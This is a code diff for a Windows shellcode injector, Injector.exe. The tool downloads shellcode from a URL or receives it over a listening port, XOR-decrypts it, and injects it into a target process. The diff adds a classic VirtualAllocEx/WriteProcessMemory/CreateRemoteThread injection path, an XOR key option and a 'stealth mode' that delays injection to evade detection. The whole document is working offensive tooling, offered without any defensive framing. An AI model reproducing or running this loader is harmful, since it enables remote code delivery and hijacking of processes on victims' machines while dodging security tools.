@@ -54,9 +54,13 @@ BOOL InitializeNTAPIs()
 	return TRUE;
 }
 
-HANDLE injectShellcode(const char* shellcode, SIZE_T size, DWORD pid)
+HANDLE injectShellcode(char* shellcode, SIZE_T size, DWORD pid, int key)
 {
 	printf("[*] The shellcode size is: %d\n", size);
+
+	if (key != 0)
+		for (int i = 0; i < size; i++)
+			shellcode[i] ^= key;
 
 	// Init variables
 	LARGE_INTEGER sectionSize = { size };
@@ -102,6 +106,44 @@ HANDLE injectShellcode(const char* shellcode, SIZE_T size, DWORD pid)
 	return targetThreadHandle;
 }
 
+HANDLE normalInjectShellcode(char* shellcode, SIZE_T size, DWORD pid, int key)
+{
+	HANDLE processHandle = NULL;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	// Decrypt with your xor key
+	if (key != 0)
+		for (int i = 0; i < size; i++)
+			shellcode[i] ^= key;
+
+	// Get handle to process
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (processHandle == NULL)
+	{
+		printf("[-] Could not get handle\n");
+		return NULL;
+	}
+
+	printf("[*] Injecting to PID: %i\n", pid);
+
+	// Allocate memory for shellcode
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+	// Write shellcode buffer to the allocated memory
+	WriteProcessMemory(processHandle, (LPVOID)remoteBuffer, shellcode, size, NULL);
+
+	// Create remote thread in memory of the process to execute the shellcode
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	if (remoteThread != NULL)
+		printf("[+] Remote thread started successfully!\n");
+
+	// Close handle to the process
+	CloseHandle(processHandle);
+
+	return remoteThread;
+}
+
 DWORD findProcess(char *process)
 {
 	DWORD pid = 0;
@@ -136,27 +178,30 @@ int main(int argc, char ** argv)
 {
 	DWORD pid = 0;
 	char* url, *port, * shellcode;
-	int shellcode_size = 0;
+	int shellcode_size = 0, key = 0;
 
 	if (cmdOptionExists(argv, argv + argc, "-h") || // Help
 		(!cmdOptionExists(argv, argv + argc, "-u") && !cmdOptionExists(argv, argv + argc, "-l")) || // Incase listen mode and url not given
 		(cmdOptionExists(argv, argv + argc, "-u") && cmdOptionExists(argv, argv + argc, "-l"))) // Incase both given
 	{
 		printf("Usage:\n"
-			"\tInjector.exe -u <URL>\n"
-			"\tInjector.exe -p <PID/Process Name> -u <URL>\n"
-			"\tInjector.exe -p <PID/Process Name> -l <LISTEN_PORT>\n"
+			"\tInjector.exe -u <URL> [-k <xor_key>]\n"
+			"\tInjector.exe -p <PID/Process Name> -u <URL> [-k <xor_key>]\n"
+			"\tInjector.exe -p <PID/Process Name> -l <LISTEN_PORT> [-k <xor_key>]\n"
 			"\tInjector.exe -h\n"
 			"Options:\n"
 			"\t-h \t Show this menu.\n"
 			"\t-u \t URL to donwload shellcode from (Not listen mode).\n"
 			"\t-p \t PID/Process name to be injected (Optional).\n"
 			"\t-l \t Listen mode port (Not download mode).\n"
+			"\t-k \t XOR key to use for decryption.\n"
+			"\t-s \t Stealth mode - the decryption and injection will start after given seconds (Default 18).\n"
+			"\t-m \t Injection mode - NT or normal(VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)\n"
 		);
 		return 1;
 	}
 
-	if (!cmdOptionExists(argv, argv + argc, "-p")) // Creates process incase PID not given
+	if (!cmdOptionExists(argv, argv + argc, "-p"))	// Creates process incase PID not given
 	{
 		PROCESS_INFORMATION pi = { 0 };
 		STARTUPINFO si = { 0 };
@@ -167,21 +212,21 @@ int main(int argc, char ** argv)
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 	}
-	else
+	else											// Get PID
 	{
 		pid = atoi(getCmdOption(argv, argv + argc, "-p"));
 		if (pid == 0)
 			pid = findProcess(getCmdOption(argv, argv + argc, "-p"));
 	}
 
-	if (cmdOptionExists(argv, argv + argc, "-u")) // Download shellcode from URL
+	if (cmdOptionExists(argv, argv + argc, "-u"))	// Download shellcode from URL
 	{
 		url = getCmdOption(argv, argv + argc, "-u");
 		string downloaded_shellcode = download(url);
 		shellcode = (char*)downloaded_shellcode.c_str();
 		shellcode_size = downloaded_shellcode.size();
 	}
-	else
+	else											// Listen mode - bind port and wait for shellcode
 	{
 		recv_shell r;
 		port = getCmdOption(argv, argv + argc, "-l");
@@ -189,8 +234,38 @@ int main(int argc, char ** argv)
 		shellcode = r.bufferReceivedBytes;
 		shellcode_size = r.receivedBytes;
 	}
+	if (cmdOptionExists(argv, argv + argc, "-k")) // XOR key
+		key = atoi(getCmdOption(argv, argv + argc, "-k"));
 
-	// Inject
-	injectShellcode(shellcode, shellcode_size, pid);
+	if (cmdOptionExists(argv, argv + argc, "-s"))	// Stealth mode
+	{
+		time_t s = time(0);
+		int sec = 0;
+		try
+		{
+			sec = atoi(getCmdOption(argv, argv + argc, "-s"));
+		}
+		catch (...)
+		{
+		}
+
+		if (sec == 0)
+			sec = 18;
+
+		printf("\n*\tIn stealth mode, waiting for %d seconds\t*\n\n", sec);
+		while (time(0) - s <= sec) { printf("\r\t%d Seconds", (time(0) - s)); }
+		printf("\n");
+	}
+
+	if (cmdOptionExists(argv, argv + argc, "-m"))
+	{
+		char* mode = getCmdOption(argv, argv + argc, "-m");
+		if (strcmp(mode, "normal") == 0)
+			normalInjectShellcode(shellcode, shellcode_size, pid, key); // Normal injection
+		else
+			injectShellcode(shellcode, shellcode_size, pid, key); // NT injection
+	}
+	else
+		injectShellcode(shellcode, shellcode_size, pid, key); // Inject
 	return 0;
 }
